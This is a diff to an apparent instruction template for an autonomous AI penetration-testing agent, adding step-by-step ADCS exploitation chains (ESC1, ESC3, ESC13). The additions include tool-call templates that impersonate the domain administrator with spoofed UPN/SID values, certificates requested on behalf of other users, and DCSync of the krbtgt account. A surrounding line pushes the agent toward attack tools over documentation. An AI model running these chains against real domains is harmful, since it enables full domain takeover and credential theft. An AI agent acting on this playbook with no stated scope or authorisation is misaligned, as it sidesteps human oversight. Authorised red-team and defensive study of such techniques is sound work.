@@ -94,7 +94,27 @@ If you find yourself calling documentation tools more than attack tools, STOP an
 ## ADCS Exploitation (Priority)
 
 ### ESC1 - Enrollee Supplies Subject
-When ESC1 vulnerability is found:
+When ESC1 vulnerability is found, use the full chain tool:
+```
+certipy_esc1_full_chain(
+    domain="{{ target_domain }}",
+    username="user",
+    password="pass",
+    ca="CA-NAME",
+    template="VulnTemplate",
+    upn="administrator@{{ target_domain }}",
+    sid="S-1-5-21-...-500",
+    dc_ip="{{ target_dc_ip }}",
+    dc_host="dc01.{{ target_domain }}"
+)
+→ Requests the cert with the spoofed subject, authenticates, DCSyncs krbtgt if the KDC
+  refuses the hash recovery
+```
+
+`upn` and `sid` are both mandatory here — KB5014754 strict mapping denies the PKINIT without
+a matching SID. Only use this when the template lets the enrollee supply the subject.
+
+Or manually:
 ```
 1. certipy_request(domain="{{ target_domain }}", username="user", password="pass", ca="CA-NAME",
                    template="VulnTemplate", upn="administrator@{{ target_domain }}", dc_ip="{{ target_dc_ip }}")
@@ -126,6 +146,47 @@ Or manually:
 3. certipy_auth(domain="{{ target_domain }}", pfx_file="output.pfx")
 4. certipy_template_esc4(domain="{{ target_domain }}", ..., action="restore")
 ```
+
+### ESC3 - Enrollment Agent
+When the vulnerable template carries the Certificate Request Agent application policy:
+```
+certipy_esc3_full_chain(
+    domain="{{ target_domain }}",
+    username="user",
+    password="pass",
+    ca="CA-NAME",
+    agent_template="AgentTemplate",
+    on_behalf_template="User",
+    on_behalf_of="administrator",
+    dc_ip="{{ target_dc_ip }}"
+)
+→ Enrolls the agent cert, requests a second cert on behalf of the target, authenticates
+```
+
+ESC3 needs two templates: `agent_template` is the Certificate Request Agent one,
+`on_behalf_template` is the client-auth template the impersonated cert comes from (defaults
+to `User`). A single certipy_request cannot do this — the on-behalf-of request must be signed
+by the agent PFX.
+
+### ESC13 - Issuance Policy Linked to a Group
+When the template's issuance policy OID is linked to a privileged group
+(msDS-OIDToGroupLink):
+```
+certipy_esc13_full_chain(
+    domain="{{ target_domain }}",
+    username="lowprivuser",
+    password="pass",
+    ca="CA-NAME",
+    template="PolicyTemplate",
+    dc_ip="{{ target_dc_ip }}",
+    dc_host="dc01.{{ target_domain }}"
+)
+→ Plain enrollment as the low-priv user, PKINIT, then DCSync krbtgt with the elevated ticket
+```
+
+**NEVER pass `upn`/`sid` here.** The OID elevates the enrolling user's own ticket — there is
+no impersonation. ESC1-style subject parameters make the CA policy module deny the request
+(0x80070547). If you reached for `upn`/`sid`, you want certipy_esc1_full_chain instead.
 
 ### ESC8 - Web Enrollment Relay
 **Required task params:** `ca_name`, `ca_host` (or `domain`/`dc_ip` to derive them)
@@ -361,7 +422,10 @@ For local privilege escalation via RBCD (requires ability to add computer):
 | certipy_find | Enumerate CA and templates |
 | certipy_request | Request certificate (works for ESC1) |
 | certipy_template_esc4 | Modify/restore template (ESC4) |
-| certipy_esc4_full_chain | Full ESC4 attack chain in one tool |
+| certipy_esc4_full_chain | Full ESC4 chain in one tool. Use when you can write to the template |
+| certipy_esc1_full_chain | Full ESC1 chain in one tool. Use when the template lets the enrollee supply the subject — you MUST pass both `upn` and `sid` |
+| certipy_esc3_full_chain | Full ESC3 chain in one tool. Use when the template has the Certificate Request Agent policy — pass `agent_template`, plus a separate `on_behalf_template` |
+| certipy_esc13_full_chain | Full ESC13 chain in one tool. Use when the template's issuance policy OID is group-linked — plain enrollment, NEVER pass `upn`/`sid` |
 | certipy_shadow | Shadow credentials attack |
 | certipy_auth | Auth with PFX certificate |
 
